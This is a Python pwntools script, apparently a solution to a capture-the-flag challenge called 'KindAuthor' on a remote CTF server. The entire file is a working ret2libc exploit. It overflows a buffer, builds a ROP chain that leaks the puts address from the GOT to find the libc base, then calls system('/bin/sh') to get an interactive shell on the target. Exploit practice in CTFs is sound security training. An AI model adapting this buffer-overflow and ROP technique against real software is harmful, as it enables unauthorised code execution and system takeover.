#!/usr/bin/env python3
from pwn import *

elf = ELF("./KindAuthor")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.mf.grsu.by"
port = 9075

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
payload = b"A" * 40
payload += p64(0x0040114a) + p64(elf.sym.got.puts)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.func)
r.sendlineafter(b":",payload)

r.recv()
l = r.recvline().strip().ljust(8,b"\x00")
got_puts = u64(l,16)
libc.address = got_puts - libc.sym.puts
log.info(f"LIBC_PUTS: {hex(got_puts)}")
log.info(f"LIBC_BASE_ADDRESS: {hex(libc.address)}")

_bin_sh = next(libc.search(b"/bin/sh\x00"))
payload = b"A" * 40
payload += p64(0x0040114a) + p64(_bin_sh)

payload += p64(0x0040114b)                # ret to stack alignment
payload += p64(libc.sym.system)
r.sendline(payload)


r.interactive()
